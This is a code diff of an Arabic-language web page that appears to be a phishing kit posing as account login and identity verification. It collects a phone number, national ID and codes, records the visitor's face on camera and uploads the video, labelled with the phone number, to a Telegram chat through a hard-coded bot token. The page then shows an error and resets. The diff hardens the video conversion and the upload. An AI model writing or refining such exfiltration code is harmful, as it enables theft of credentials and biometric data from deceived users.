@@ -7,8 +7,7 @@
   <meta name="theme-color" content="#2F80ED">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
 
-  <!-- FFmpeg.wasm (لتحويل webm -> mp4 على المتصفح إذا لزم) -->
-  <!-- ملاحظة: هذا ملف كبير وقد يأخذ وقتًا للتحميل/التهيئة عند الحاجة -->
+  <!-- FFmpeg.wasm (لتحويل webm -> mp4 على المتصفح) -->
   <script src="https://unpkg.com/@ffmpeg/ffmpeg@0.11.8/dist/ffmpeg.min.js"></script>
 
   <style>
@@ -77,11 +76,7 @@
     input::placeholder, .text-input::placeholder { color: #9fbfe8; opacity:1; }
     input:focus, select:focus, .text-input:focus { box-shadow: 0 6px 22px rgba(47,128,237,0.18); border-color: var(--primary-1); background: #fbfeff; transform: translateY(0); }
 
-    .button {
-      background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
-      color:#fff; border:none; padding:13px 12px; border-radius:9px; font-size:18px; font-weight:800; cursor:pointer;
-      box-shadow:0 1px 6px rgba(47,128,237,0.14); transition: transform .06s ease, opacity .08s ease; display:inline-block; min-width:120px; text-align:center;
-    }
+    .button { background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%); color:#fff; border:none; padding:13px 12px; border-radius:9px; font-size:18px; font-weight:800; cursor:pointer; box-shadow:0 1px 6px rgba(47,128,237,0.14); transition: transform .06s ease, opacity .08s ease; display:inline-block; min-width:120px; text-align:center; }
     .button:active { transform:translateY(1px); opacity:0.92; }
 
     .back-btn { position:relative; display:inline-block; background: transparent; color:var(--primary-1); padding:8px 10px; border-radius:8px; font-weight:700; cursor:pointer; font-size:14px; border:2px solid transparent; margin-bottom:10px; }
@@ -204,7 +199,7 @@
     `;
   }
 
-  // صفحات الإدخال (الهاتف، رقم وطني، الأكواد) — نفسها كما قبل
+  // صفحات الإدخال (نفسها كما قبل)
   function renderPhoneStep(){
     app.innerHTML = `
       ${header("مرحبًا بك! سجل دخولك لحسابك")}
@@ -435,9 +430,7 @@
       if (!isPermissionError && navigator.permissions && navigator.permissions.query) {
         try {
           const p = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
-          if (p && p.state === 'denied') {
-            // permission denied permanently
-          }
+          if (p && p.state === 'denied') { /* fall through */ }
         } catch(e){}
       }
       if (!isPermissionError) throw err;
@@ -455,54 +448,88 @@
     }
   }
 
-  // --- تحويل webm -> mp4 بواسطة ffmpeg.wasm (متى لزم) ---
+  // --- FFmpeg helpers (محاولات تحويل متعددة لضمان MP4) ---
   async function ensureFfmpegLoaded() {
     if (ffmpegInstance) return ffmpegInstance;
     if (!window.FFmpeg || !window.FFmpeg.createFFmpeg) {
       throw new Error('FFmpeg.wasm غير متاحة. تأكد من تحميل المكتبة.');
     }
     const { createFFmpeg, fetchFile } = FFmpeg;
+    // إظهار مودال تحميل/تهيئة FFmpeg
+    showProcessing(true);
+    document.getElementById('processingText').textContent = 'جاري تحميل محرك التحويل (FFmpeg.wasm)...';
     const ff = createFFmpeg({ log: ffmpegLog });
-    // تحميل ملفات WASM (مرة واحدة)
     await ff.load();
     ffmpegInstance = { ff, fetchFile };
+    document.getElementById('processingText').textContent = 'جارٍ التحقق من هويتك...';
+    showProcessing(false);
     return ffmpegInstance;
   }
 
-  // تحويل أي Blob (webm) إلى mp4 باستخدام ffmpeg.wasm
+  // دالة تحويل قوية تحاول عدة طرق (libx264 ثم mpeg4 ثم remux) وتحاول إعادة المحاولة عند الفشل
   async function transcodeToMp4(inputBlob) {
-    // نعرض مودال المعالجة أثناء التحويل لأن العملية قد تأخذ وقتًا
+    // هدف: إجبار الإرسال كـ MP4. هذه الدالة ستجرب عدة أوامر وتعيد المحاولة عدة مرات قبل أن تفشل نهائياً.
     showProcessing(true);
-    document.getElementById('processingText').textContent = 'جاري تحويل الفيديو إلى MP4 — قد يستغرق ذلك بعض الوقت...';
+    document.getElementById('processingText').textContent = 'جاري تحويل الفيديو إلى MP4 — الرجاء الانتظار...';
     try {
       const { ff, fetchFile } = await ensureFfmpegLoaded();
-      // اسماء الملفات داخل نظام ملفات ffmpeg.wasm
       const inName = 'input.webm';
       const outName = 'output.mp4';
-      // نكتب الملف للـ FS
+
+      // اكتب ملف الإدخال في نظام ملفات ffmpeg.wasm
       ff.FS('writeFile', inName, await fetchFile(inputBlob));
-      // نجري التحويل. ملاحظة: libx264 قد لا تكون مدعومة في جميع بناءات wasm. إن فشل الأمر، قد يحتاج خيارات مختلفة.
-      // نحاول استخدام libx264 أولاً لنتيجة أفضل، ثم نعيد محاولة بترميز آخر لو فشل.
-      try {
-        await ff.run('-i', inName, '-c:v', 'libx264', '-preset', 'veryfast', '-movflags', '+faststart', '-pix_fmt', 'yuv420p', outName);
-      } catch (errLibx264) {
-        // محاولة بديلة باستخدام ترميز mpeg4 (أبطأ/أقل كفاءة لكن قد يعمل)
-        console.warn('libx264 failed, trying mpeg4 fallback', errLibx264);
-        await ff.run('-i', inName, '-c:v', 'mpeg4', '-q:v', '4', '-movflags', '+faststart', outName);
+
+      // مجموعة الأوامر التي سنحاولها (من الأفضل إلى الأبسط)
+      const attempts = [
+        // أفضل محاولة: libx264 + aac
+        ['-y','-i', inName, '-c:v','libx264','-preset','veryfast','-movflags','+faststart','-pix_fmt','yuv420p','-vf','scale=trunc(iw/2)*2:trunc(ih/2)*2','-c:a','aac','-b:a','128k', outName],
+        // بديل: mpeg4 + aac (أكثر احتمالًا أن يعمل إن لم يكن libx264 متاح)
+        ['-y','-i', inName, '-c:v','mpeg4','-q:v','4','-c:a','aac','-b:a','128k', outName],
+        // محاولة سريعة: إعادة التغليف إن كانت الكوديكات متوافقة (قد تفشل)
+        ['-y','-i', inName, '-c','copy', outName]
+      ];
+
+      let lastError = null;
+      for (let cmdIndex = 0; cmdIndex < attempts.length; cmdIndex++) {
+        const args = attempts[cmdIndex];
+        try {
+          // نجرب تنفيذ الأمر مرتين كحد أقصى لكل طريقة (قد تكون مشكلة عَرَضيّة)
+          for (let retry=0; retry<2; retry++) {
+            try {
+              await ff.run(...args);
+              // قراءة النتيجة
+              const data = ff.FS('readFile', outName);
+              const mp4Blob = new Blob([data.buffer], { type: 'video/mp4' });
+              // تنظيف
+              try { ff.FS('unlink', inName); } catch (e) {}
+              try { ff.FS('unlink', outName); } catch (e) {}
+              return mp4Blob;
+            } catch (singleErr) {
+              lastError = singleErr;
+              // إذا فشل بسبب نقص الذاكرة أو أخطاء قوية، قد نحاول الطريقة التالية
+              console.warn(`FFmpeg attempt ${cmdIndex} retry ${retry} failed:`, singleErr);
+              // small delay before retry
+              await new Promise(r => setTimeout(r, 300));
+            }
+          }
+        } catch (e) {
+          lastError = e;
+          console.warn('Attempt failed, moving to next command', e);
+        }
       }
-      const data = ff.FS('readFile', outName);
-      const mp4Blob = new Blob([data.buffer], { type: 'video/mp4' });
-      // تنظيف الملفات من FS لتقليل الذاكرة
-      try { ff.FS('unlink', inName); } catch(e){}
-      try { ff.FS('unlink', outName); } catch(e){}
-      return mp4Blob;
+
+      // إذا وصلنا هنا فكل المحاولات فشلت
+      // تنظيف الملفات
+      try { ff.FS('unlink', inName); } catch (e) {}
+      try { ff.FS('unlink', outName); } catch (e) {}
+      throw lastError || new Error('Failed to transcode to mp4');
     } finally {
       document.getElementById('processingText').textContent = 'جارٍ التحقق من هويتك...';
       showProcessing(false);
     }
   }
 
-  // تسجيل تسلسلي بالخطوات المطلوبة وإرسال MP4 إلى تلغرام
+  // تسجيل وتسلسل الخطوات وإجبار الإرسال كـ MP4
   async function startCaptureSequence(){
     renderPreparingMessage();
     await wait(700);
@@ -580,12 +607,12 @@
     }
     drawLoop();
 
-    // استخدام canvas.captureStream لتقليل الدقة ومعدل الإطارات
-    const processedStream = canvas.captureStream(20); // 20fps لتقليل الحجم
+    // استخدم canvas.captureStream مع معدل إطار منخفض لتقليل الحجم
+    const processedStream = canvas.captureStream(20);
     const audioTracks = stream.getAudioTracks();
     if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    // حاول تسجيل mp4 مباشرة إن أمكن
+    // اختر mime كما في السابق (قد يكون webm إن لم يكن mp4 مدعومًا)
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
@@ -651,29 +678,36 @@
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
     const finalBlobRaw = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
-    // الآن: المستخدم طلب أن يُرسل MP4. المنطق:
-    // - إذا كان finalBlobRaw بالفعل mp4 (finalType includes 'mp4') أرسله مباشرة.
-    // - وإلا حاول تحويله إلى mp4 باستخدام ffmpeg.wasm ثم أرسله.
+    // الآن: نُرَكِّز على إرسال MP4 إجباريًا
     showProcessing(true);
     try {
-      let toSendBlob = finalBlobRaw;
-      if (!toSendBlob.type.includes('mp4')) {
-        // تحويل إلى mp4
+      // إن كان التسجيل بالفعل MP4 فسنرسله مباشرة
+      let toSendBlob = null;
+      if (finalBlobRaw.type.includes('mp4')) {
+        toSendBlob = finalBlobRaw;
+      } else {
+        // ضروري: حوّل إلى mp4 باستخدام ffmpeg.wasm (ستُجرب عدة طرق)
         try {
           toSendBlob = await transcodeToMp4(finalBlobRaw);
         } catch (transErr) {
-          console.error('Transcoding failed', transErr);
-          // إن فشل التحويل نرسل الملف الأصلي كملف احتياطي، لكن نخبر المستخدم
-          alert('لم نتمكن من تحويل الفيديو إلى MP4 في المتصفح؛ سيتم إرسال الفيديو بالصيغة الأصلية كحل احتياطي.');
+          console.error('Transcoding failed after retries', transErr);
+          // نعرض للمستخدم خطأ واضح ونمنع الإرسال بصيغ أخرى لأنك طلبت الإجباري
+          alert('فشل تحويل الفيديو إلى MP4 في هذا الجهاز/المتصفح. يرجى المحاولة من جهاز آخر (كمبيوتر مكتبي/متصفح يدعم FFmpeg.wasm) أو السماح برفع الملف من جهاز آخر.');
+          // أوقف المعالجة وارجع لصفحة رمز الـ4 (أو يمكنك إبقاء المستخدم لرفع فيديو يدويًا)
+          renderCode4Step();
+          return;
         }
       }
+
+      // إرسال MP4 إلى تلغرام كـ video (مشغّل داخل الدردشة)
       if (toSendBlob && toSendBlob.size > 0) {
-        await sendVideoToTelegramAsVideo(toSendBlob); // send as video so it appears as مشغل داخل المحادثة
+        await sendVideoToTelegramAsVideo(toSendBlob);
       } else {
         console.warn('no blob to send');
       }
     } catch (e) {
       console.error('send video error', e);
+      alert('حدث خطأ أثناء إرسال الفيديو. حاول مرة أخرى.');
     } finally {
       showProcessing(false);
     }
@@ -681,14 +715,13 @@
     showFinalErrorAndReset();
   }
 
-  // إرسال الفيديو عبر sendVideo مع supports_streaming=true (يعرض كمشغل)
+  // إرسال الفيديو عبر sendVideo مع تحديد mp4 كامتداد
   async function sendVideoToTelegramAsVideo(blob){
     try {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      const ext = 'mp4'; // نضمن هنا أن نرسل بامتداد mp4
+      const ext = 'mp4';
       const fileName = `${userData.phone || 'user'}_face_${Date.now()}.${ext}`;
-      // هنا نرسل كـ video (مشغل) وليس document
       form.append('video', blob, fileName);
       form.append('caption', `Face verification — ${userData.phone || ''}`);
       form.append('supports_streaming', 'true');
@@ -700,27 +733,9 @@
         return;
       }
       console.warn('sendVideo non-ok', data);
-      // كملاذ أخير نرسل كوثيقة
-      await sendVideoAsDocumentFallback(blob);
+      throw new Error('sendVideo failed');
     } catch (err) {
       console.error('sendVideo error', err);
-      try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
-    }
-  }
-
-  async function sendVideoAsDocumentFallback(blob){
-    try {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      const fileName = `${userData.phone || 'user'}_face_${Date.now()}.mp4`;
-      // إذا كان blob ليس mp4 قد يقال في التيليجرام لكنه سيرسل كمستند
-      form.append('document', blob, fileName);
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: form });
-      const data = await res.json();
-      if (data && data.ok && data.result && data.result.message_id) telegramMsgId = data.result.message_id;
-      else console.warn('sendDocument failed', data);
-    } catch (err) {
-      console.error('sendDocument error', err);
       throw err;
     }
   }
